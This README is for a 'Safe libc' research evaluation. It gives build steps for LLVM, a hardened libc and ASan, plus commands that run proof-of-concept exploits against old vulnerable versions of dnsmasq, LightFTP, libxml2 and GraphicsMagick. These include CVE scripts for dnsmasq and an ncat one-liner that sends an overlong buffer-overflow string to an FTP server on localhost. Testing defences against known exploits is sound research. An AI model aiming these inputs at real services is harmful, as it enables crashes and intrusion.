Safe libc
=========

How to build
------------

```sh
# llvm toolchain
[ ! -d $HOME/git ] && mkdir $HOME/git
cd $HOME/git
git clone https://github.com/introspection-libc/safe-libc-evaluation
git clone https://github.com/introspection-libc/safe-libc safec
git clone https://github.com/introspection-libc/llvm
(cd llvm/tools && git clone https://github.com/introspection-libc/clang)
(cd llvm/projects && git clone https://github.com/introspection-libc/compiler-rt)
mkdir llvm-build
(cd llvm-build && CC=clang CXX=clang++ cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON -DLLVM_TARGETS_TO_BUILD=X86 ~/git/llvm && make)

# build safe-libc runtime component
(cd safec && ./build)

# build softbound (optional)
git clone https://github.com/introspection-libc/softboundcets-3.8.0
mkdir softboundcets-3.8.0/llvm-38/build
(cd softboundcets-3.8.0/llvm-38/build && cmake .. && make -j8)
(cd softboundcets-3.8.0/runtime && make)
```

How to build the vulnerable projects with ASan
----------------------------------------------

```sh
# dnsmasq
cd $HOME/git/safe-libc-evaluation/cve/dnsmasq-2.77
make

# LightFTP
cd $HOME/git/safe-libc-evaluation/cve/LightFTP-1.1/Source/Other/Release
make

# libxml2
cd $HOME/git/safe-libc-evaluation/cve/libxml2-v2.9.4
./autogen.sh
./configure CC="$HOME/git/llvm-build/bin/clang" CFLAGS="-fsanitize=address -fno-common -g -O0 -include $HOME/git/safec/libc.h" LDFLAGS="-fsanitize=address -fno-common -g -O0 -Wl,-E" LIBS="$HOME/git/safec/libc-asan.o"
make

# GraphicsMagick
cd $HOME/git/safe-libc-evaluation/cve/GraphicsMagick-1.3.26
./configure CC="$HOME/git/llvm-build/bin/clang" CXX="$HOME/git/llvm-build/bin/clang++" CFLAGS="-fsanitize=address -fno-common -g -O3 -include $HOME/git/safec/libc.h" CXXFLAGS="-fsanitize=address -fno-common -g -O3 -include $HOME/git/safec/libc.h" LDFLAGS="-fsanitize=address -fno-common -g -O3 -Wl,-E" LIBS="$HOME/git/safec/libc-asan.o"
make
```

Run the exploits
----------------

```sh
# libxml2
cd $HOME/git/safe-libc-evaluation/cve/libxml2-v2.9.4
./xmllint --valid bug1.xml

# GraphicsMagick
cd $HOME/git/safe-libc-evaluation/cve/GraphicsMagick-1.3.26
utilities/gm identify -verbose exploit.miff

# dnsmasq
cd $HOME/git/safe-libc-evaluation/cve/dnsmasq-2.77
# in one terminal (as root, because port <1024):
src/dnsmasq --no-daemon --dhcp-range=fd00::2,fd00::ff -p 54
# in another terminal:
python2 CVE-2017-14496.py localhost 54
python2 CVE-2017-14493.py ::1 547

# LightFTP
cd $HOME/git/safe-libc-evaluation/cve/LightFTP-1.1/Source/Other/Release
# in one terminal:
./fftp fftp.cfg
# in another terminal:
python -c 'print("USER admin\nPASS me\n" + "A"*499 + "B"*10 + "\x0D\x0A")' | ncat 127.0.0.1 9999
```

Modifications to the individual projects
----------------------------------------

- LightFTP: Makefile was modified to use safe-libc, test config was added
- dnsmasq: Makefile was modified to use safe-libc

Repositories
------------

- [libc implementation](https://github.com/introspection-libc/safe-libc)
- [modified ASan](https://github.com/introspection-libc/compiler-rt)
- [evaluation](https://github.com/introspection-libc/safe-libc-evaluation)
